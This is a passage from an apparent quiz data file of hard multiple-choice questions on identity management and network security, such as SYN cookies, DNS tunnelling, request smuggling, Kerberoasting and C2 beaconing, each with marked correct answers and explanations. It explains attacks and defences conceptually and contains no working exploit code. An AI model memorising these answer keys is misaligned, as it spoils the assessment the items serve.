    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'Over five years, an enterprise cloud environment accumulated 500 custom IAM roles. Many roles contain wildcard permissions (*) or AdministratorAccess assigned to developers who only needed access to specific S3 buckets during past troubleshooting tasks. Which identity governance practice and technical capability addresses this "privilege bloat"?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Disabling all IAM roles and forcing developers to use root account logins exclusively.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Increasing password complexity requirements for cloud console access.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Conducting automated access recertification reviews combined with cloud IAM Access Analyzers / CloudTrail activity-based permission resizing to trim unused permissions.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Encrypting IAM policies using TLS certificates.', isCorrect: false }
    ],
    explanation: 'Addressing privilege accumulation ("permission bloat") requires two complementary controls: 1) Identity Governance recertification reviews (where managers periodically audit and approve active access), and 2) Automated least-privilege policy generation (analyzing actual CloudTrail/audit logs to determine used vs. unused API calls, and automatically shrinking broad policies down to tight, minimal permissions).'
  },

  // 24. OAuth 2.0 Token Introspection (RFC 7662) -> Correct Answer: B
  {
    id: 'iam-24',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An API Gateway acts as a Policy Enforcement Point (PEP) for microservices. When a client presents an opaque access token, the API Gateway needs to determine if the token is currently active, what scopes were granted, and which user/client subject it belongs to. Which standardized OAuth 2.0 protocol endpoint should the API Gateway query?',
    options: [
      { id: 'opt-a', label: 'A', text: 'OAuth 2.0 Dynamic Client Registration Endpoint (RFC 7591).', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'OAuth 2.0 Token Introspection Endpoint (RFC 7662).', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'OAuth 2.0 Token Revocation Endpoint (RFC 7009).', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'OpenID Connect Discovery Endpoint (RFC 8414).', isCorrect: false }
    ],
    explanation: 'RFC 7662 defines the OAuth 2.0 Token Introspection endpoint, which allows authorized resource servers (or API Gateways) to query the authorization server to determine the active state, scope, expiration, client_id, and subject of an opaque access token. RFC 7009 governs token revocation (allowing clients to invalidate tokens upon logout).'
  },

  // 25. Zero Trust Policy Evaluation Pillars -> Correct Answer: D
  {
    id: 'iam-25',
    categoryId: 'iam',
    category: 'IDENTITY & ACCESS MANAGEMENT',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise identity architect designs conditional access policies for a global organization. The business policy states: "Access to corporate financial applications requires a corporate-managed healthy device, authentication via phishing-resistant FIDO2 MFA, and originating from allowed geographic regions; requests violating any condition must be denied or challenged." Which rule design represents a robust Zero Trust policy structure?',
    options: [
      { id: 'opt-a', label: 'A', text: 'A single static rule allowing all traffic from corporate IP ranges with no authentication requirements.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'A fallback rule granting access if the user correctly enters a security question answer.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Enforcing conditional checks exclusively during initial account creation and disabling them for subsequent logins.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'A policy requiring evaluation of explicit Signals (User Identity + Risk Score, Device Managed/Compliant state, Location/IP threat intelligence), enforcing Controls (FIDO2 MFA requirement), and applying Block/Grant with Step-Up conditions continuously at runtime.', isCorrect: true }
    ],
    explanation: 'Modern Zero Trust identity engines continuously evaluate three core pillars: Signals (User/Group, Device Health/Compliance from MDM/EDR, Location/Network Risk, Real-time User/Sign-in Risk), Controls (Require Phishing-Resistant MFA, Require Compliant Device, Require Password Change), and Outcomes (Grant, Block, Require Step-Up).'
  },

  // ==========================================
  // 30 HARD / ADVANCED NETWORK SECURITY QUESTIONS
  // Correct answers are naturally distributed across A, B, C, and D.
  // ==========================================

  // 1. TCP/IP security (Traffic / Log Interpretation) -> Correct Answer: A
  {
    id: 'net-1',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A network engineer notices that under a severe TCP SYN flood targeting a web server, the server continues accepting legitimate connections without exhausting its connection backlog queue. Packet inspection shows SYN-ACK packets with initial sequence numbers generated from a cryptographic hash of client/server sockets and a secret seed. Which mechanism is operating?',
    options: [
      { id: 'opt-a', label: 'A', text: 'TCP SYN Cookies', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'TCP Fast Open (TFO)', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'TCP Window Scaling', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Stateful TCP Proxying', isCorrect: false }
    ],
    explanation: 'TCP SYN Cookies allow a host to defend against SYN flood attacks by postponing Transmission Control Block (TCB) allocation until the final ACK of the three-way handshake is received. Connection state parameters are cryptographically encoded directly into the initial sequence number (ISN).'
  },

  // 2. TCP handshake and connection behavior (Protocol Reasoning) -> Correct Answer: C
  {
    id: 'net-2',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'During a packet analysis of an unencrypted TCP session, an attacker transmits a forged packet with the RST flag set. Under RFC 5961 guidelines, under what condition will the receiving host immediately terminate the connection upon receiving this RST frame?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The source IP address matches the peer, regardless of the sequence number.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The ACK flag is also set and matches the next expected transmission byte exactly.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The packet has a valid checksum and its sequence number falls within the current receive window.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'The TCP window size field in the RST frame is explicitly set to zero.', isCorrect: false }
    ],
    explanation: 'Per RFC 5961 / RFC 793, a receiving host requires the sequence number of an incoming TCP RST packet to lie within the active receive window. Out-of-window RST packets are dropped or answered with a challenge ACK to prevent blind connection termination attacks.'
  },

  // 3. DNS security and DNS abuse (Scenario-Based) -> Correct Answer: D
  {
    id: 'net-3',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A SOC analyst detects a sudden outbound network bandwidth saturation from the organization\'s public DNS server. Packet captures show high-volume UDP port 53 responses containing large ANY or TXT records sent to an external target IP that never originated prior requests to the server. What is the root cause?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The internal DNS server cache has been poisoned with rogue A records.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'An attacker compromised the registrar and modified authoritative NS records.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'The DNS server is suffering from a cache side-channel timing attack.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The public DNS server is acting as an open recursive resolver exploited in a DNS amplification attack.', isCorrect: true }
    ],
    explanation: 'DNS Amplification is a reflection-based DDoS attack where adversaries send small spoofed requests (with the victim\'s source IP) to open recursive resolvers. The resolvers respond with amplified payloads (like ANY or TXT records using EDNS0) to the victim. Disabling open recursion prevents this vulnerability.'
  },

  // 4. DNS tunneling concepts (Traffic / Log Interpretation) -> Correct Answer: B
  {
    id: 'net-4',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A SIEM rule triggers on internal DNS resolver logs displaying high-frequency queries to `[random-string].cx.threat-domain.net`. The queries request TXT records, return long base64-encoded strings, and exhibit Shannon entropy values above 4.8. Endpoint telemetry shows no active web browser process on the client. What is the threat assessment?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Legitimate DNS-over-HTTPS (DoH) bootstrap resolution', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'DNS Tunneling used for command-and-control (C2) or data exfiltration', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Standard DNSSEC zone walking enumeration', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Multi-CDN dynamic IP round-robin resolution', isCorrect: false }
    ],
    explanation: 'DNS Tunneling encapsulates non-DNS payloads (such as C2 commands or exfiltrated files) within DNS subdomains and TXT/NULL record responses. High-entropy subdomains, unusual record types (TXT/NULL), persistent single-domain query streams, and non-browser process origin are key indicators.'
  },

  // 5. HTTP/HTTPS security (Scenario-Based) -> Correct Answer: A
  {
    id: 'net-5',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise infrastructure uses a reverse proxy in front of a back-end app server. An attacker submits an HTTP POST request where the proxy relies on the `Content-Length` header to delineate request limits, while the back-end server parses `Transfer-Encoding: chunked`. What vulnerability does this architectural misalignment introduce?',
    options: [
      { id: 'opt-a', label: 'A', text: 'HTTP Request Smuggling (CL.TE)', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Server-Side Request Forgery (SSRF)', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Cross-Site WebSocket Hijacking (CSWSH)', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'HTTP Strict Transport Security (HSTS) Bypass', isCorrect: false }
    ],
    explanation: 'HTTP Request Smuggling occurs when front-end proxies and back-end servers interpret HTTP message boundaries differently. In a CL.TE flaw, the proxy routes based on `Content-Length` while the back-end processes `Transfer-Encoding`, enabling the attacker to "smuggle" an arbitrary secondary request into the back-end queue.'
  },

  // 6. TLS certificates and trust (Conceptual Advanced) -> Correct Answer: C
  {
    id: 'net-6',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise security team wants to detect rogue or unauthorized X.509 SSL/TLS certificates issued for their domain by any trusted Certificate Authority globally, without modifying client endpoints. Which mechanism fulfills this capability?',
    options: [
      { id: 'opt-a', label: 'A', text: 'HTTP Public Key Pinning (HPKP)', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'OCSP Stapling (TLS Certificate Status Request)', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Certificate Transparency (CT) log monitoring', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'DNS Certification Authority Authorization (CAA) record lookup', isCorrect: false }
    ],
    explanation: 'Certificate Transparency (CT) mandates that public CAs log all issued X.509 certificates to publicly auditable, append-only cryptographic logs. Continuous monitoring of CT logs alerts domain administrators instantly when any CA issues a certificate for their domains.'
  },

  // 7. TLS handshake concepts (Protocol Reasoning) -> Correct Answer: D
  {
    id: 'net-7',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'In TLS 1.3, static RSA key exchange was completely deprecated and removed from the protocol specification. What fundamental security property does this removal enforce across all TLS 1.3 connections?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Protection against Server Name Indication (SNI) eavesdropping', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Zero-RTT session resumption immunity to replay attacks', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Universal client-side certificate authentication', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Mandatory Perfect Forward Secrecy (PFS)', isCorrect: true }
    ],
    explanation: 'Static RSA key exchange allowed anyone possessing the server\'s private key to retroactively decrypt captured historical traffic. By mandating ephemeral Diffie-Hellman (ECDHE), TLS 1.3 enforces Perfect Forward Secrecy (PFS), ensuring past session keys remain secure even if long-term private keys are compromised later.'
  },

  // 8. Network segmentation (Architecture / Design) -> Correct Answer: A
  {
    id: 'net-8',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A network architect needs to prevent lateral network communication between virtual machines hosted on the same hypervisor within a single /24 subnet. Traditional Layer 3 default gateway firewalls cannot inspect intra-subnet traffic. Which implementation directly addresses this limitation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Private VLANs (PVLANs) or Software-Defined Micro-segmentation via distributed firewalls', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Expanding the subnet allocation from /24 to /23', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Configuring Equal-Cost Multi-Path (ECMP) routing on the switch core', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Enabling IGMP Snooping on the distribution layer switch', isCorrect: false }
    ],
    explanation: 'Intra-subnet host communication occurs at Layer 2 and bypasses default gateway firewalls. Micro-segmentation (using hypervisor distributed virtual firewalls) or Private VLANs (isolated community ports) enforces security policies directly at the virtual vNIC interface, blocking lateral movement within the same IP subnet.'
  },

  // 9. VLAN security (Conceptual Advanced) -> Correct Answer: B
  {
    id: 'net-9',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'In a double-tagging VLAN hopping attack (802.1Q), an attacker attached to an access port sends a frame with outer tag VLAN 10 (the switch port native VLAN) and inner tag VLAN 20 (the target victim VLAN). How does this frame cross into VLAN 20?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The first switch strips the inner tag and routes the payload over Layer 3.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The first switch strips the outer native VLAN tag when forwarding over a trunk, allowing the downstream switch to inspect the inner tag and deliver to VLAN 20.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Double tagging floods the MAC address table, forcing the switch to operate as a hub.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'The switch converts the frame into a Spanning Tree Protocol BPDU to enable trunking.', isCorrect: false }
    ],
    explanation: 'When an 802.1Q switch receives a frame tagged with the native VLAN on an access port, it strips the native VLAN header when sending across a trunk link. The secondary switch receives the frame, reads the remaining inner tag (VLAN 20), and forwards it to the victim VLAN segment.'
  },

  // 10. Firewalls and stateful inspection (Scenario-Based) -> Correct Answer: D
  {
    id: 'net-10',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'Following a network topology update, database clients experience dropped connections. Analysis shows TCP SYN packets enter via Firewall A, but return SYN-ACK packets from the database server route out through Firewall B. Firewall B drops the SYN-ACKs with log entry `Invalid TCP State: No prior SYN`. What issue exists?',
    options: [
      { id: 'opt-a', label: 'A', text: 'TCP SYN Cookie suppression failure', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Path MTU Discovery (PMTUD) ICMP black hole', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Dynamic ARP Inspection (DAI) policy drop', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Asymmetric routing breaking stateful firewall session tracking', isCorrect: true }
    ],
    explanation: 'Stateful firewalls maintain connection tracking tables. If outbound traffic exits Firewall A and inbound return traffic flows back through Firewall B (asymmetric routing), Firewall B encounters SYN-ACK packets without an established state table record and drops them as invalid protocol state.'
  },

  // 11. IDS vs IPS (Traffic / Log Interpretation) -> Correct Answer: C
  {
    id: 'net-11',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A Network Intrusion Detection System (NIDS) is deployed out-of-band via a switch SPAN (mirror) port. When a high-severity Remote Code Execution signature triggers on an active TCP session, which response mechanism can the SPAN-attached NIDS execute to interrupt the session?',
    options: [
      { id: 'opt-a', label: 'A', text: 'In-line payload packet dropping before arrival at the target endpoint', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Real-time HTTP payload scrubbing and parameter sanitization', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Injection of forged TCP RST packets to both connection endpoints', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Port-level IEEE 802.3x hardware pause-frame link shutdown', isCorrect: false }
    ],
    explanation: 'Because a SPAN/TAP NIDS receives duplicate copies of network traffic out-of-band, it cannot drop or alter packets in transit. Its active response capability is sending forged TCP RST packets to both source and destination to forcibly tear down the TCP state on the endpoints.'
  },

  // 12. Network Detection and Response (Scenario-Based) -> Correct Answer: A
  {
    id: 'net-12',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An NDR platform alerts on encrypted HTTPS traffic outbound to an external IP, matching JA3 fingerprint hash `e7d705a3286e19ea42f587b344ee6865` linked to a Cobalt Strike beacon framework. How did the NDR compute this fingerprint without performing TLS decryption?',
    options: [
      { id: 'opt-a', label: 'A', text: 'By hashing specific fields in the unencrypted Client Hello packet (TLS version, Ciphers, Extensions, Elliptic Curves)', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'By parsing plaintext HTTP Host headers following SSL stripping', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'By extracting session key material from endpoint process memory', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'By decrypting the Server Name Indication (SNI) payload', isCorrect: false }
    ],
    explanation: 'JA3 generates TLS client fingerprints by hashing five specific fields transmitted in cleartext within the initial `Client Hello` message: TLS Version, Accepted Cipher Suites, Extensions, Elliptic Curves, and Elliptic Curve Formats. This identifies client binaries even over encrypted channels.'
  },

  // 13. VPN security (Architecture / Design) -> Correct Answer: B
  {
    id: 'net-13',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise IPsec remote access VPN relies on IKEv1 Aggressive Mode with Pre-Shared Keys (PSK). Why is this setup considered a critical security vulnerability?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Aggressive Mode disables ESP encryption and forces AH mode only.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'IKEv1 Aggressive Mode transmits the client authentication hash unencrypted in the second exchange message, enabling offline PSK cracking.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'IKEv1 Aggressive Mode fails to support Diffie-Hellman key exchanges.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Aggressive Mode requires static public IP addresses for all mobile clients.', isCorrect: false }
    ],
    explanation: 'In IKEv1 Aggressive Mode, the authentication hash containing the pre-shared key (PSK) hash is sent unencrypted in message 2. Passive network eavesdroppers can capture this hash and conduct offline brute-force or dictionary attacks to recover the PSK.'
  },

  // 14. Authentication over networks (Scenario-Based) -> Correct Answer: C
  {
    id: 'net-14',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'During an internal network security assessment, an attacker executes Kerberoasting. Which step of the Kerberos protocol exchange is exploited in this technique?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Submitting an AS-REQ request without pre-authentication to extract client ticket salts.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Sniffing NTLMv2 challenge-response hashes over port 445 SMB sessions.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Requesting a Ticket Granting Service ticket (TGS-REQ) for a valid Service Principal Name (SPN) and cracking the returned TGS-REP offline.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Forging a Ticket Granting Ticket (TGT) using a stolen Krbtgt key hash.', isCorrect: false }
    ],
    explanation: 'Kerberoasting allows any authenticated domain user to request a TGS ticket (TGS-REQ) for any account with a registered Service Principal Name (SPN). The KDC returns a TGS-REP encrypted with the service account\'s password hash, which the attacker extracts and cracks offline.'
  },

  // 15. Network access control (Architecture / Design) -> Correct Answer: D
  {
    id: 'net-15',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An organization implements IEEE 802.1X port security across all switch access ports configured with EAP-TLS. What infrastructure requirement is mandatory on both supplicant endpoints and the RADIUS server for successful authentication?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Active Directory domain passwords sent via MS-CHAPv2 over cleartext RADIUS.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'A WPA3 Enterprise pre-shared passphrase stored in switch flash memory.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'A MAC Address Bypass (MAB) table configured on the core router.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Valid X.509 digital certificates installed on both the endpoint supplicant and RADIUS server for mutual certificate authentication.', isCorrect: true }
    ],
    explanation: 'EAP-TLS provides strong mutual authentication for 802.1X. Both the client endpoint (supplicant) and the RADIUS server must possess valid X.509 certificates signed by a trusted internal or public Certificate Authority.'
  },

  // 16. Zero Trust networking (Architecture / Design) -> Correct Answer: B
  {
    id: 'net-16',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise transitions from legacy full-tunnel IPsec VPNs to a Zero Trust Network Access (ZTNA) model. How does ZTNA restrict user access compared to traditional VPN architectures?',
    options: [
      { id: 'opt-a', label: 'A', text: 'ZTNA assigns endpoints directly to internal subnets with unrestricted Layer 3 routing.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'ZTNA enforces identity- and context-aware micro-tunnels granting access strictly to authorized individual applications (L7) rather than entire network segments.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'ZTNA routes corporate traffic over unencrypted GRE tunnels through BGP Anycast edge nodes.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'ZTNA uses switch-level hardware MAC address filtering for remote authorization.', isCorrect: false }
    ],
    explanation: 'Traditional VPNs grant broad Layer 3 network segment access upon connection. ZTNA abstracts network access and establishes encrypted, least-privilege, application-specific (L7) connections, keeping unauthorized internal applications hidden from remote endpoints.'
  },

  // 17. East-west vs north-south traffic (Conceptual Advanced) -> Correct Answer: A
  {
    id: 'net-17',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'In cloud network architecture, an attacker compromises a web application server receiving public internet traffic and subsequently pivots to an internal database server within the same VPC. Which network traffic boundary was crossed during the pivoting phase?',
    options: [
      { id: 'opt-a', label: 'A', text: 'East-West traffic boundary', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'North-South traffic boundary', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Loopback inter-process IPC boundary', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Edge egress transit gateway boundary', isCorrect: false }
    ],
    explanation: '"North-South" describes traffic flowing into or out of a data center/cloud perimeter (e.g., client to web server). "East-West" describes lateral traffic moving internally between workloads, virtual machines, or microservices within the internal environment.'
  },

  // 18. ARP and local-network security (Traffic / Log Interpretation) -> Correct Answer: C
  {
    id: 'net-18',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'A network monitor logs gratuitous ARP replies on a switch access segment: `192.168.1.1 is at 00:11:22:33:44:55` and `192.168.1.100 is at 00:11:22:33:44:55`. MAC address `00:11:22:33:44:55` belongs to a host on Port 12. Which managed switch feature prevents this MITM attack?',
    options: [
      { id: 'opt-a', label: 'A', text: 'PortFast with BPDU Guard', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Spanning Tree Root Guard', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Dynamic ARP Inspection (DAI) validated against the DHCP Snooping database', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'IGMP Snooping with Storm Control', isCorrect: false }
    ],
    explanation: 'Dynamic ARP Inspection (DAI) intercepts and validates ARP requests and responses against the trusted DHCP Snooping binding table (or static IP-to-MAC maps). Invalid ARP responses attempting to hijack IP-to-MAC mappings are dropped at the switch port.'
  },

  // 19. DHCP security concepts (Conceptual Advanced) -> Correct Answer: A
  {
    id: 'net-19',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An attacker broadcasts thousands of DHCPDISCOVER messages with randomized source MAC addresses across an enterprise LAN. What is the immediate objective of this attack, and what switch control mitigates it?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Exhausting the DHCP pool (DHCP Starvation) to deploy a Rogue DHCP server; mitigated by DHCP Snooping and Port Security.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Overfilling the TCAM switch buffer to force hub-mode flooding; mitigated by BPDU Guard.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Corrupting DNS root hints on the default gateway; mitigated by DNSSEC.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Saturating backplane bandwidth via multicast loops; mitigated by Storm Control.', isCorrect: false }
    ],
    explanation: 'DHCP Starvation attacks exhaust all available IP addresses in a legitimate DHCP pool by spoofing distinct MAC addresses. Once the pool is exhausted, the attacker introduces a Rogue DHCP server to distribute malicious gateway and DNS configurations. DHCP Snooping and Port Security prevent this attack.'
  },

  // 20. IP spoofing (Protocol Reasoning) -> Correct Answer: D
  {
    id: 'net-20',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An Internet Service Provider (ISP) enforces BCP 38 standards to prevent customer networks from originating traffic with spoofed source IP addresses outside their allocated prefix. Which router feature implements BCP 38 filtering at ingress interface boundaries?',
    options: [
      { id: 'opt-a', label: 'A', text: 'IEEE 802.1Q trunk tagging', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Multiprotocol BGP (MP-BGP) route reflection', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'NAT64 translation tables', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Unicast Reverse Path Forwarding (uRPF)', isCorrect: true }
    ],
    explanation: 'Unicast Reverse Path Forwarding (uRPF) enforces BCP 38 guidelines by checking whether the source IP address of an incoming packet matches a valid entry in the router\'s Forwarding Information Base (FIB) associated with the receiving interface. Packets with invalid source routing paths are dropped.'
  },

  // 21. DDoS detection and mitigation (Traffic / Log Interpretation) -> Correct Answer: B
  {
    id: 'net-21',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'During a volumetric DDoS attack targeting an edge firewall, netflow telemetry reveals incoming UDP port 123 traffic from public NTP servers with payload sizes 100x larger than the initial outbound queries. What is the MOST effective immediate network mitigation?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Enabling local TCP SYN cookies on the edge firewall', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Rerouting domain traffic to an upstream BGP Anycast scrubbing center to absorb reflection traffic and drop monlist responses', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Flushing internal active Directory DNS cache entries', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Rebooting edge switches to clear queue buffers', isCorrect: false }
    ],
    explanation: 'In NTP monlist reflection DDoS attacks, massive amplified UDP payloads saturate upstream ISP connectivity before reaching the perimeter. Local firewalls cannot process or absorb link-saturating traffic. Upstream BGP Anycast scrubbing centers filter reflection floods at internet scale.'
  },

  // 22. Network reconnaissance detection (Traffic / Log Interpretation) -> Correct Answer: C
  {
    id: 'net-22',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'Firewall logs record a scan against a public web server originating from a single remote host within 5 seconds: TCP packets with `FIN, URG, PSH` flags set, `ACK = 0`, and `SEQ = 0`. What scanning method is being executed, and what is its mechanism?',
    options: [
      { id: 'opt-a', label: 'A', text: 'TCP SYN Scan; to complete 3-way handshakes silently.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'TCP ACK Scan; to map stateful firewall rule tables.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Xmas Tree Scan; to bypass simple stateless firewall filters and deduce port state based on RFC 793 response behavior (closed ports return RST, open ports ignore).', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'UDP Sweep; to enumerate SNMP community strings.', isCorrect: false }
    ],
    explanation: 'A Xmas Tree scan turns on FIN, URG, and PSH flags. RFC 793 specifies that closed ports receiving out-of-state packets without an ACK should reply with a TCP RST, whereas open ports drop the packet without responding. Attackers use this to evade basic stateless packet filters.'
  },

  // 23. C2 traffic analysis (Traffic / Log Interpretation) -> Correct Answer: A
  {
    id: 'net-23',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'Analysis of egress proxy logs shows a workstation initiating HTTP POST outbound requests to `198.51.100.44` every 60 seconds with a variance of ±0.15 seconds. Payload length is consistently 256 bytes. What network anomaly does this pattern reflect?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Low-jitter automated C2 malware beaconing', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'High-jitter interactive SSH tunnel terminal session', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Standard user web browsing with HTTP/2 stream multiplexing', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Asynchronous AJAX long-polling from an active browser tab', isCorrect: false }
    ],
    explanation: 'Command and Control (C2) agents often send regular automated heartbeat check-ins ("beacons") to attacker infrastructure. Low variance in check-in intervals (low jitter) coupled with uniform request payload sizes strongly signifies automated process execution rather than human browsing.'
  },

  // 24. Beaconing patterns (Scenario-Based) -> Correct Answer: D
  {
    id: 'net-24',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'Modern Command and Control (C2) frameworks incorporate configurable "Jitter" parameters (e.g., 25% randomized transmission delays) into beacon schedules. What defensive detection technique does jitter specifically target?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Forcing packets to traverse distinct BGP Autonomous System paths.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Preventing stateful firewalls from computing TCP sequence numbers.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Compressing HTTP headers to reduce exfiltration footprint.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Defeating time-series frequency analysis and mathematical periodicity algorithms in SIEM/NDR systems.', isCorrect: true }
    ],
    explanation: 'Automated beaconing detection relies on identifying strict mathematical periodicity (e.g., connections occurring exactly every 60 seconds). Jitter introduces pseudo-random delays between check-ins, disrupting fixed periodic intervals and masking C2 activity as background web traffic.'
  },

  // 25. Proxy and gateway security (Architecture / Design) -> Correct Answer: A
  {
    id: 'net-25',
    categoryId: 'network',
    category: 'NETWORK SECURITY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise deploys an outbound Forward Proxy with active TLS Inspection (SSL Decryption). What deployment step is required on corporate endpoints to prevent user browsers from displaying untrusted certificate warnings?',
    options: [
